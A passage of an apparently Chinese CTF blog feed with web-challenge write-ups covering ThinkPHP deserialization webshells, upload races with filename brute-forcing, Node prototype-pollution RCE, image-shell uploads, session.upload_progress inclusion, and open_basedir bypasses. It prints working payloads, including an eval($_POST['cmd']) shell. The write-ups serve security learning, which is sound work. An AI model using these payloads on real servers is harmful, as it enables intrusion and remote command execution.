class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;            <span class="hljs-keyword">if</span> (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties); <span class="hljs-comment">//比较两个数组的键名，并返回交集</span>            &#125;        &#125;        <span class="hljs-keyword">return</span> $contents;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]); <span class="hljs-comment">//json编码</span>        <span class="hljs-comment">//此处return的complete -&gt; A类的set(,$contents,)-&gt;B类 set(,$value,) -&gt;$data = $this-&gt;serialize($value);</span>        <span class="hljs-comment">//即complete的内容应为webshell的内容，json_encode出来的中括号[]等字符，不在base64编码表内，base6解码写入webshell的时候会自动去除</span>    &#125;</code></pre><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">protected</span> $store;    <span class="hljs-keyword">protected</span> $key;    <span class="hljs-keyword">protected</span> $expire;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-keyword">new</span> B();        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-number">0</span>;        <span class="hljs-keyword">$this</span>-&gt;autosave = <span class="hljs-literal">false</span>;        <span class="hljs-keyword">$this</span>-&gt;cache = [];        <span class="hljs-keyword">$this</span>-&gt;complete = <span class="hljs-string">&#x27;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes = <span class="hljs-number">0</span>;        <span class="hljs-keyword">$this</span>-&gt;options = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,                                <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/shell.php&#x27;</span>,                                <span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&#x27;strval&#x27;</span>); <span class="hljs-comment">//strval加了相当于不加，只是为了用到serialize</span>    &#125;&#125;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> A));<span class="hljs-meta">?&gt;</span></code></pre><p>传入数据后蚁剑连接即可：</p><p><img src="/2021/08/20/hjs/4.png" alt="4"></p><h1>[RoarCTF 2019]Simple Upload</h1><p>知识点：</p><ul><li>Thinkphp错误使用Upload类导致getshell</li></ul><p>从源码可以看出它使用了<a href="https://www.chabug.org/tags/thinkphp">thinkphp</a>，总结几点有用信息：</p><blockquote><p>Think PHP上传默认路径是/home/index/upload</p></blockquote><blockquote><p>Think PHP upload()多文件上传<br>think PHP里的upload()函数在不传参的情况下是批量上传的，可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测，我们可以上传两次1.txt,获取php文件的后缀，因为这里的后缀命名方式运用了<strong>uniqid函数</strong>它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。</p></blockquote><blockquote><p>ThinkPHP 上传文件名爆破<br>先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件</p></blockquote><blockquote><p><strong>$upload-&gt;allowExts</strong> 并不是 <strong>Think\Upload</strong> 类的正确用法，所以 <strong>allowexts</strong> 后缀名限制无效。</p></blockquote><p>先测试两个txt文件名是有几位数不同：</p><p><img src="/2021/08/20/hjs/3.png" alt="3"></p><p>脚本：</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">url</span> = &#x27;http://c<span class="hljs-number">8125</span>b<span class="hljs-number">29</span>-<span class="hljs-number">7862</span>-<span class="hljs-number">46</span>f<span class="hljs-number">5</span>-<span class="hljs-number">9628</span>-<span class="hljs-number">9</span>cb<span class="hljs-number">43</span>a<span class="hljs-number">8</span>f<span class="hljs-number">2</span>c<span class="hljs-number">51</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php/Home/Index/upload&#x27;<span class="hljs-attribute">file1</span> = &#123;&#x27;file&#x27;:open(&#x27;<span class="hljs-number">1</span>.txt&#x27;,&#x27;r&#x27;)&#125;<span class="hljs-attribute">file2</span> = &#123;&#x27;file[]&#x27;:open(&#x27;<span class="hljs-number">1</span>.php&#x27;,&#x27;r&#x27;)&#125; <span class="hljs-attribute">r</span> = requests.post(url,files = file<span class="hljs-number">1</span>)<span class="hljs-attribute">print</span> (r.text)<span class="hljs-attribute">r</span> = requests.post(url,files = file<span class="hljs-number">2</span>)<span class="hljs-attribute">print</span> (r.text)<span class="hljs-attribute">r</span> = requests.post(url, files = file<span class="hljs-number">1</span>)<span class="hljs-attribute">print</span> (r.text)</code></pre><p>有5位不同，用脚本爆破</p><pre><code class="hljs apache"><span class="hljs-attribute">dir</span>=&#x27;abcdefghijklmnopqrstuvwxyz<span class="hljs-number">0123456789</span>&#x27;<span class="hljs-attribute">for</span> i in dir:    <span class="hljs-attribute">for</span> j in dir:        <span class="hljs-attribute">for</span> x in dir:            <span class="hljs-attribute">for</span> y in dir:                <span class="hljs-attribute">for</span> z in dir:                    <span class="hljs-attribute">url</span>=&#x27;http://<span class="hljs-number">42</span>ce<span class="hljs-number">58</span>e<span class="hljs-number">8</span>-bbfa-<span class="hljs-number">427</span>d-b<span class="hljs-number">9</span>c<span class="hljs-number">2</span>-c<span class="hljs-number">732</span>b<span class="hljs-number">517</span>a<span class="hljs-number">827</span>.node<span class="hljs-number">3</span>.buuoj.cn/Public/Uploads/<span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">04</span>/<span class="hljs-number">5</span>fc<span class="hljs-number">9</span>da<span class="hljs-number">34</span>&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;.txt&#x27;.format(i,j,x,y,z)                    <span class="hljs-attribute">r</span> = requests.get(url)                    <span class="hljs-attribute">print</span>(url)                    <span class="hljs-attribute">if</span> r.status_code== <span class="hljs-number">200</span>:                        <span class="hljs-attribute">print</span>(url)                        <span class="hljs-attribute">break</span></code></pre><p>或者bp爆破也行，得到正确路径后访问：</p><p><img src="/2021/08/20/hjs/2.png" alt="2"></p><p>参考：<a href="https://www.cnblogs.com/zhwyyswdg/p/14086311.html">https://www.cnblogs.com/zhwyyswdg/p/14086311.html</a></p>]]></content>
    
    
    <categories>
      
      <category>js原链污染</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu（九）</title>
    <link href="/2021/08/19/me/"/>
    <url>/2021/08/19/me/</url>
    
    <content type="html"><![CDATA[<h1>[GYCTF2020]Ez_Express</h1><p>题目要求admin登录，扫目录得到源码：</p><img src="/2021/08/19/me/1.png" alt="1" style="zoom:67%;"><p>在路由里发现了<code>merge()</code>和<code>clone()</code>，典型的原链污染开端，之前学过：<a href="https://liquor-boop.github.io/2021/04/18/js/">js原型链污染</a>主要是利用点：控制并修改一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。</p><p>往下在<code>/action</code>的路由中找到<code>clone()</code>：</p><p><img src="/2021/08/19/me/2.png" alt="2"></p><p>用户身份必须为admin，跟进登录路由</p><p><img src="/2021/08/19/me/3.png" alt="3"></p><p>传入的userid经过了<code>safeKeyword</code>函数：</p><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;      <span class="hljs-keyword">return</span> keyword  &#125;</code></pre><p>通过正则来过滤掉admin(大小写)，不过前面有一处：<code>'user':req.body.userid.toUpperCase()</code>将user转为大写，转编码一般会出问题：</p><blockquote><h5 id="toUpperCase"><a class="header-anchor" href="#toUpperCase">🍭</a>toUpperCase()</h5><p>其中混入了两个奇特的字符&quot;ı&quot;、“ſ”。</p><p>这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() == ‘I’，“ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><h5 id="toLowerCase"><a class="header-anchor" href="#toLowerCase">🍭</a>toLowerCase()</h5><p>这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() == ‘k’.</p><p>详见<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">javascript大小写特性</a></p></blockquote><p>故用<code>admın</code>注册即可，admin登录后，开始找原型链污染的参数，</p><p><img src="/2021/08/19/me/4.png" alt="4"></p><p><code>/info</code>路由下，将<code>outputFunctionName</code>渲染入<code>index</code>中，而<code>outputFunctionName</code>并没有定义，</p><p><img src="/2021/08/19/me/5.png" alt="5"></p><p>那就可以通过污染<code>outputFunctionName</code>进行SSTI，抓<code>/action</code>的包（clone从/action路由开始），<code>Content-Type</code>设为<code>application/json</code></p><p>payload</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;lua&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="hljs-attr">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</code></pre><p>即可在/info路由下载到flag</p><p>参考：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p><a href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p><h1>[CISCN2021 Quals]upload</h1><h4 id="分析"><a class="header-anchor" href="#分析">🍭</a>分析</h4><p>题目给了index.php，对上传文件做了如下限制：</p><ul><li><p>图片的长宽必须为1</p><p>使用XMB头绕过</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre></li><li><p><code>getimagesize</code></p></li><li><p>文件名不能有c、i、h</p><p>平常用的.htaccess 的h被过滤，.use.ini 的i被过滤</p></li></ul><p>部分字母在经过<code>mb_strtolower</code>处理过可以等效普通字母</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(mb_strtolower(<span class="hljs-string">&#x27;İ&#x27;</span>)===<span class="hljs-string">&#x27;i&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#结果为true</span>前面还进行了url解密，故可用%c4%b0代替<span class="hljs-string">&#x27;İ&#x27;</span>字符</code></pre><p>但还是没有相关字母可以代替php；扫目录，发现example.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;要不咱们再看看？&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;都不能解压呢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;可以解压，我想想存哪里&quot;</span>;    $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>我们需要上传<code>zip</code>，然后通过这个程序解压,我们已经知道<code>i</code>的绕过方法，还需要绕过<code>imagecreatefrompng</code>,<code>imagepng</code>如果直接在图片最后写一个一句话木马，会被GD库给去掉，我们需要用脚本构造图片马（类似二次渲染的操作），<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">脚本</a></p><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>生成图片马</p><p><img src="/2021/08/19/me/6.png" alt="6"></p><p>将图片头压入压缩包。先将文件头写进文本，<em>要加一行换行</em>，因为后面需要解压，这个文件头需要放到压缩包后面。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre><p>合并：</p><p><img src="/2021/08/19/me/10.png" alt="10"></p><p>上传</p><p><img src="/2021/08/19/me/7.png" alt="7"></p><p>解压</p><p><img src="/2021/08/19/me/19.png" alt="19"></p><p>会解压到/example,蚁剑连接</p><p><img src="/2021/08/19/me/8.png" alt="8"></p><p>参考：<a href="https://www.plasf.cn/">https://www.plasf.cn/</a></p><h1>[WMCTF2020]Make PHP Great Again</h1><p>源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;  <span class="hljs-keyword">require_once</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];&#125;</code></pre><h4 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h4><blockquote><p>require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p><p>详见：<a href="https://www.anquanke.com/post/id/213235#h3-2">文章</a></p></blockquote><p>payload</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php</code></pre><h4 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h4><p>利用session.upload_progress进行文件包含</p><p>在PHP&gt;5.4，session.upload_progress.enabled这个参数在php.ini中默认开启，在上传的过程中会生成上传进度文件，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ，它的存储路径可以在phpinfo中查到</p><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.prefix</span> = <span class="hljs-string">&quot;upload_progress_&quot;</span><span class="hljs-attr">session.upload_progress.name</span> = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></code></pre><h5 id="配置"><a class="header-anchor" href="#配置">🍭</a>配置</h5><pre><code class="hljs ini"><span class="hljs-attr">session.use_strict_mode</span>=<span class="hljs-literal">off</span>  <span class="hljs-comment">#cookie中的sessionid可控</span><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">on</span><span class="hljs-attr">session.upload_progress.cleanup</span> = <span class="hljs-literal">on</span></code></pre><h5 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h5><p>我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，再去利用竞争在session清空前包含session文件，达到Getshell的目的</p><h5 id="限制"><a class="header-anchor" href="#限制">🍭</a>限制</h5><p>如何获取session的位置：session.use_strict_mode默认值为0，此时用户可以自己定义PHPSESSID，并且PHP会自动初始化session，并产生一个键值，这个键值由session.upload_progress.prefix和session.upload_progress.name组成，最后被写入session文件里，该文件保存为/tmp/sess_PHPSESSID</p><h5 id="解题-v2"><a class="header-anchor" href="#解题-v2">🍭</a>解题</h5><blockquote><p>方式一:</p><p>burp，在本地上传，然后抓包，加一下<code>PHPSESSID</code>，爆破它的值，就可以RCE</p><p>upload.html:</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>方式二：</p><p>利用脚本</p><pre><code class="hljs routeros">import ioimport requestsimport threadingsessid = <span class="hljs-string">&#x27;peri0d&#x27;</span>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125; def write(session):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)        resp = session.post( <span class="hljs-string">&#x27;http:xxx/&#x27;</span>, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;peri0d.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )def read(session):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        resp = session.post(<span class="hljs-string">&#x27;http:xxx/?file=/tmp/sess_&#x27;</span>+sessid,<span class="hljs-attribute">data</span>=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;peri0d.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:            <span class="hljs-builtin-name">print</span>(resp.text)                        event.clear()        <span class="hljs-keyword">else</span>:            <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;++++++++++++++++&#x27;</span>)<span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&quot;__main__&quot;:    <span class="hljs-attribute">event</span>=threading.Event()    with requests.session() as session:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(1,30):             threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(1,30):            threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()    event.<span class="hljs-builtin-name">set</span>()</code></pre></blockquote><p>参考：<a href="https://blog.csdn.net/weixin_48537150/article/details/113189052">https://blog.csdn.net/weixin_48537150/article/details/113189052</a></p>]]></content>
    
    
    <categories>
      
      <category>require_once包含</category>
      
      <category>图片马</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass open_basedir</title>
    <link href="/2021/08/17/open/"/>
    <url>/2021/08/17/open/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h2><h4 id="open-basedir"><a class="header-anchor" href="#open-basedir">🍭</a>open_basedir</h4><p>open_basedir是php的一个配置,它可将用户访问文件的活动范围限制在指定的区域如<code>open_basedir=/var/www/html/:/tmp/</code>，则用户无法获取除了/var/www/html/和/tmp/这两个目录以外的文件。<em>用open_basedir指定的限制实际上是前缀,而不是目录名</em>。若<code>open_basedir = /dir/user</code>, 那么目录 <code>/dir/user</code>和<code>/dir/user1</code>都是可以访问的。所以如果要将访问限制在仅为指定的目录，需用斜线结束路径名。</p><h4 id="符号链接"><a class="header-anchor" href="#符号链接">🍭</a>符号链接</h4><p>符号链接又叫软链接,是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。</p><h2 id="绕过（linux）"><a class="header-anchor" href="#绕过（linux）">🍭</a>绕过（linux）</h2><h4 id="命令执行函数"><a class="header-anchor" href="#命令执行函数">🍭</a>命令执行函数</h4><p>open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。但命令执行函数一般都会被限制在disable_function当中，所以用处不大。</p><h4 id="symlink-函数"><a class="header-anchor" href="#symlink-函数">🍭</a>symlink()函数</h4><blockquote><p>建立符号连接</p> <pre><code class="hljs d">symlink(<span class="hljs-built_in">string</span> <span class="hljs-string">`$target`</span>, <span class="hljs-built_in">string</span> <span class="hljs-string">`$link`</span>): <span class="hljs-built_in">bool</span></code></pre><p><strong>symlink()</strong> 对于已有的 <code>target</code> 建立一个名为 <code>link</code> 的符号连接。target:连接的目标,link:连接的名称.</p></blockquote><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>        mkdir(<span class="hljs-string">&quot;c&quot;</span>);        chdir(<span class="hljs-string">&quot;c&quot;</span>);        mkdir(<span class="hljs-string">&quot;d&quot;</span>);        chdir(<span class="hljs-string">&quot;d&quot;</span>);        chdir(<span class="hljs-string">&quot;..&quot;</span>);        chdir(<span class="hljs-string">&quot;..&quot;</span>);        symlink(<span class="hljs-string">&quot;c/d&quot;</span>,<span class="hljs-string">&quot;tmplink&quot;</span>);        symlink(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);        unlink(<span class="hljs-string">&quot;tmplink&quot;</span>);        mkdir(<span class="hljs-string">&quot;tmplink&quot;</span>);        <span class="hljs-keyword">echo</span> file_put_contents(<span class="hljs-string">&quot;http://127.0.0.1/exploit&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><h5 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h5><pre><code class="hljs less"><span class="hljs-selector-tag">symlink</span>(<span class="hljs-string">&quot;tmplink/../../1.txt&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>);</code></pre><p>此时tmplink还是一个符号链接文件，它指向的路径是c/d，因此exploit指向的路径就变成了</p><pre><code class="hljs awk">c<span class="hljs-regexp">/d/</span>..<span class="hljs-regexp">/../</span><span class="hljs-number">1</span>.txt</code></pre><p>由于这个路径在open_basedir的范围之内所以exploit成功建立了。之后我们删除tmplink符号链接文件再新建一个同名为tmplink的文件夹，这时exploit所指向的路径为</p><pre><code class="hljs awk">tmplink<span class="hljs-regexp">/../</span>../</code></pre><p>这时候tmplink变成了一个真实存在的文件夹所以tmplink/…/…/变成了1.txt所在的目录即/var/www/，然后再通过访问符号链接文件exploit即可直接读取到1.txt的文件内容。</p><p>另一种做法：</p><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);symlink(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);symlink(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);unlink(<span class="hljs-string">&#x27;foo&#x27;</span>);symlink(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);</code></pre><h4 id="glob伪协议"><a class="header-anchor" href="#glob伪协议">🍭</a>glob伪协议</h4><p>glob是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，它在筛选目录时不受open_basedir的限制。</p><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>        $a = <span class="hljs-string">&quot;glob:///xxx/xxx/xxx/*.php&quot;</span>;        <span class="hljs-keyword">if</span> ( $b = opendir($a) ) &#123;                <span class="hljs-keyword">while</span> ( ($file = readdir($b)) !== <span class="hljs-literal">false</span> ) &#123;                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.$file.<span class="hljs-string">&quot;\n&quot;</span>;                &#125;                closedir($b);        &#125;<span 